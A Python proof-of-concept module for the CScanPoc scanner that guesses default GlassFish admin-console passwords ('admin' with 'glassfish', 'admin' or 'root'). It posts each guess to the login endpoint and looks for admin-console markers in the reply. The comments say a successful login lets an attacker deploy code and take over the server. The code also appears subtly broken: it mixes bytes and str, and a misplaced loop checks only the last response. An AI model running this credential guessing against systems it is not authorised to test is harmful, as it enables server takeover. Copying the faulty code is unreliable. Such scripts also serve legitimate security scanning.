# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'crack_glassfish'  # 平台漏洞编号
    name = 'GlassFish弱口令'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.MISCONFIGURATION  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        攻击者通过此漏洞可以登陆管理控制台，通过部署功能可直接获取服务器权限。
    '''  # 漏洞描述
    ref = 'Unknown'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'GlassFish'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '11b9a298-6aa9-48a3-8668-b807732749b5'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = '{target}'.format(target=self.target)
            timeout = 10
            error_i = 0
            flag_list = ['Just refresh the page... login will take over', 'GlassFish Console - Common Tasks',
                         '/resource/common/js/adminjsf.js">', 'Admin Console</title>', 'src="/homePage.jsf"',
                         'src="/header.jsf"', 'src="/index.jsf"', '<title>Common Tasks</title>', 'title="Logout from GlassFish']
            user_list = ['admin']
            pawssword_list = ['glassfish', 'admin', 'root']
            for user in user_list:
                for password in pawssword_list:
                    try:
                        PostStr = 'j_username=%s&j_password=%s&loginButton=Login&loginButton.DisabledHiddenField=true' % (
                            user, password)
                        request = urllib.request.Request(
                            url + '/j_security_check?loginButton=Login', PostStr)
                        res = urllib.request.urlopen(request, timeout=timeout)
                        res_html = res.read()
                    except urllib.error.HTTPError:
                        return
                    except urllib.error.URLError:
                        error_i += 1
                        if error_i >= 3:
                            return
                        continue
                for flag in flag_list:
                    if flag in res_html:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
